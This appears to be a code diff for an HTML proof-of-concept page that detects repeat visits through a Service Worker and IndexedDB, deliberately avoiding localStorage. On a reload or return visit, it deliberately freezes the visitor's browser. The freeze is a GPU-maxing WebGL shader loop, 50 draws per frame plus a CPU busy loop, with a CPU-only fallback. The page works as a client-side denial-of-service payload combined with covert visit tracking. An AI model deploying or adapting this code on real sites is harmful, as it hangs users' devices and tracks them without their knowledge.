@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SW Detection PoC</title>
+    <title>SW-Only Detection PoC</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -23,6 +23,7 @@
         }
         .fresh { background: #16a34a; }
         .cached { background: #dc2626; }
+        .waiting { background: #ca8a04; }
         #info {
             max-width: 600px;
             text-align: center;
@@ -36,72 +37,66 @@
             height: 100%;
             z-index: -1;
         }
+        button {
+            background: #3b82f6;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover { background: #2563eb; }
+        code {
+            background: #333;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 0.9em;
+        }
     </style>
 </head>
 <body>
-    <h1>Service Worker + Visit Detection PoC</h1>
-    <div id="status">Checking...</div>
+    <h1>Service Worker Only Detection PoC</h1>
+    <div id="status" class="waiting">Initializing...</div>
     <div id="info"></div>
     <canvas id="canvas"></canvas>
 
     <script>
         // ============================================
-        // AGGRESSIVE DETECTION - Multiple Methods
+        // SERVICE WORKER ONLY DETECTION
+        // No localStorage or sessionStorage used!
         // ============================================
 
-        const VISIT_KEY = '__poc_visited__';
-        const SESSION_KEY = '__poc_session__';
-
-        // Generate unique session ID
-        function generateSessionId() {
-            return Math.random().toString(36).substring(2) + Date.now().toString(36);
-        }
-
-        // Check if this is a duplicate/cached visit
-        function isRepeatedVisit() {
-            // Method 1: localStorage - tracks across all visits
-            const hasVisited = localStorage.getItem(VISIT_KEY);
-
-            // Method 2: sessionStorage - tracks within same tab session
-            const currentSession = sessionStorage.getItem(SESSION_KEY);
-
-            // Method 3: Service Worker controller check
-            const swControlled = !!(navigator.serviceWorker && navigator.serviceWorker.controller);
-
-            // Method 4: Performance API - transferSize = 0 means from cache
-            let fromCache = false;
-            if (window.performance) {
-                const navEntries = performance.getEntriesByType('navigation');
-                if (navEntries.length > 0 && navEntries[0].transferSize === 0) {
-                    fromCache = true;
-                }
+        // Check visit status injected by Service Worker
+        function checkSWVisitStatus() {
+            // Method 1: Check injected global variable (set by SW before this script runs)
+            if (window.__SW_VISIT_STATUS__) {
+                return {
+                    isRepeatVisit: window.__SW_VISIT_STATUS__.isRepeatVisit,
+                    source: window.__SW_VISIT_STATUS__.source,
+                    reason: window.__SW_VISIT_STATUS__.isRepeatVisit
+                        ? 'SW IndexedDB: page already visited'
+                        : 'SW IndexedDB: first visit'
+                };
             }
 
-            // Method 5: Check if page was reloaded
-            const isReload = performance.navigation ?
-                (performance.navigation.type === 1) :
-                (performance.getEntriesByType('navigation')[0]?.type === 'reload');
+            // Method 2: Check if SW is controlling this page (fallback)
+            if (navigator.serviceWorker && navigator.serviceWorker.controller) {
+                // SW is active but didn't inject status - might be a race condition
+                // This shouldn't happen normally, but we handle it
+                return {
+                    isRepeatVisit: false,
+                    source: 'sw-controller-check',
+                    reason: 'SW active but no status injected (first load)'
+                };
+            }
 
-            console.log('[DETECTION]', {
-                hasVisited: !!hasVisited,
-                currentSession: !!currentSession,
-                swControlled,
-                fromCache,
-                isReload
-            });
-
-            // AGGRESSIVE: Trigger on ANY of these conditions
-            if (hasVisited) return { triggered: true, reason: 'localStorage: already visited' };
-            if (swControlled && fromCache) return { triggered: true, reason: 'SW served from cache' };
-            if (swControlled && isReload) return { triggered: true, reason: 'SW + page reload' };
-
-            return { triggered: false, reason: 'fresh visit' };
-        }
-
-        // Mark as visited
-        function markVisited() {
-            localStorage.setItem(VISIT_KEY, Date.now().toString());
-            sessionStorage.setItem(SESSION_KEY, generateSessionId());
+            // Method 3: No SW control yet - definitely first visit
+            return {
+                isRepeatVisit: false,
+                source: 'no-sw-control',
+                reason: 'Service Worker not yet active (first visit)'
+            };
         }
 
         // ============================================
@@ -126,7 +121,6 @@
 
             console.log('[FREEZE] Starting WebGL freeze');
 
-            // Vertex shader
             const vsSource = `
                 attribute vec4 a_position;
                 void main() {
@@ -134,7 +128,6 @@
                 }
             `;
 
-            // AGGRESSIVE fragment shader - heavy math operations
             const fsSource = `
                 precision highp float;
                 uniform float u_time;
@@ -144,7 +137,6 @@
                     vec2 uv = gl_FragCoord.xy / u_resolution;
                     float v = 0.0;
 
-                    // Nested loops with heavy trig operations
                     for(int i = 0; i < 500; i++) {
                         for(int j = 0; j < 20; j++) {
                             float fi = float(i);
@@ -191,7 +183,6 @@
 
             gl.useProgram(program);
 
-            // Create fullscreen quad
             const positions = new Float32Array([
                 -1, -1,  1, -1,  -1, 1,
                 -1,  1,  1, -1,   1, 1
@@ -212,17 +203,14 @@
 
             let time = 0;
 
-            // AGGRESSIVE render loop - multiple draws per frame
             function render() {
                 time += 0.5;
                 gl.uniform1f(timeUniform, time);
 
-                // Draw multiple times per frame to max out GPU
                 for (let i = 0; i < 50; i++) {
                     gl.drawArrays(gl.TRIANGLES, 0, 6);
                 }
 
-                // Also do some CPU work
                 let x = 0;
                 for (let i = 0; i < 100000; i++) {
                     x += Math.sin(i) * Math.cos(i);
@@ -234,7 +222,6 @@
             render();
         }
 
-        // CPU-only freeze fallback
         function cpuFreeze() {
             console.log('[FREEZE] Starting CPU freeze');
 
@@ -254,33 +241,48 @@
         // MAIN EXECUTION
         // ============================================
 
-        // Register Service Worker
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('sw.js')
-                .then(reg => {
-                    console.log('[SW] Registered:', reg.scope);
-                    // Force update check
-                    reg.update();
-                })
-                .catch(err => console.log('[SW] Registration failed:', err));
-        }
-
-        // Run detection after short delay
-        setTimeout(() => {
+        // Register Service Worker first
+        async function init() {
             const statusEl = document.getElementById('status');
             const infoEl = document.getElementById('info');
 
-            const result = isRepeatedVisit();
+            // Register SW if not already registered
+            if ('serviceWorker' in navigator) {
+                try {
+                    const reg = await navigator.serviceWorker.register('sw.js');
+                    console.log('[SW] Registered:', reg.scope);
 
-            if (!result.triggered) {
-                // First visit - mark and allow
-                markVisited();
+                    // If SW just registered and not controlling yet, this is definitely first visit
+                    if (!navigator.serviceWorker.controller) {
+                        console.log('[SW] First registration - waiting for control');
 
+                        // Wait for SW to take control
+                        await new Promise((resolve) => {
+                            navigator.serviceWorker.addEventListener('controllerchange', resolve);
+                            // Timeout after 2 seconds - proceed anyway
+                            setTimeout(resolve, 2000);
+                        });
+                    }
+                } catch (err) {
+                    console.log('[SW] Registration failed:', err);
+                }
+            }
+
+            // Check visit status
+            const result = checkSWVisitStatus();
+            console.log('[DETECTION] Result:', result);
+
+            if (!result.isRepeatVisit) {
+                // First visit - show success
                 statusEl.textContent = 'FIRST VISIT - OK';
                 statusEl.className = 'fresh';
                 infoEl.innerHTML = `
+                    <p><strong>Detection Source:</strong> ${result.source}</p>
                     <p><strong>Reason:</strong> ${result.reason}</p>
-                    <p>This page has been marked as visited.</p>
+                    <hr style="margin: 20px 0; border-color: #444;">
+                    <p>This page uses <strong>Service Worker + IndexedDB only</strong>.</p>
+                    <p>No localStorage or sessionStorage is used!</p>
+                    <hr style="margin: 20px 0; border-color: #444;">
                     <p><strong>Now try:</strong></p>
                     <ul style="text-align:left;">
                         <li>Reload this page (Ctrl+R / Cmd+R)</li>
@@ -289,21 +291,46 @@
                     </ul>
                     <p>Any of these will trigger the freeze!</p>
                     <hr style="margin: 20px 0; border-color: #444;">
-                    <p><small>To reset: Open DevTools → Application → Clear Storage</small></p>
+                    <p><strong>To reset:</strong></p>
+                    <button onclick="resetVisits()">Reset via SW Message</button>
+                    <p><small>Or: DevTools → Application → Service Workers → Unregister + Clear Storage</small></p>
                 `;
             } else {
-                // Repeated visit - FREEZE
+                // Repeat visit - FREEZE
                 statusEl.textContent = 'REPEAT VISIT - FREEZING!';
                 statusEl.className = 'cached';
                 infoEl.innerHTML = `
+                    <p><strong>Detection Source:</strong> ${result.source}</p>
                     <p><strong>Reason:</strong> ${result.reason}</p>
-                    <p style="color: #f87171; font-size: 20px;">Triggering WebGL freeze NOW...</p>
+                    <p style="color: #f87171; font-size: 20px; margin-top: 20px;">
+                        Triggering WebGL freeze NOW...
+                    </p>
+                    <p><small>The Service Worker detected this is not your first visit.</small></p>
+                    <p><small>Visit tracking is stored in IndexedDB within the SW scope.</small></p>
                 `;
 
-                // Immediate freeze
                 setTimeout(triggerFreeze, 500);
             }
-        }, 500);
+        }
+
+        // Reset visits via SW message
+        function resetVisits() {
+            if (navigator.serviceWorker && navigator.serviceWorker.controller) {
+                navigator.serviceWorker.controller.postMessage({ type: 'RESET_VISITS' });
+
+                navigator.serviceWorker.addEventListener('message', function handler(event) {
+                    if (event.data.type === 'RESET_COMPLETE') {
+                        alert('Visits reset! Reload the page.');
+                        navigator.serviceWorker.removeEventListener('message', handler);
+                    }
+                });
+            } else {
+                alert('Service Worker not active. Clear site data manually.');
+            }
+        }
+
+        // Run after short delay to ensure SW injection has happened
+        setTimeout(init, 100);
     </script>
 </body>
 </html>
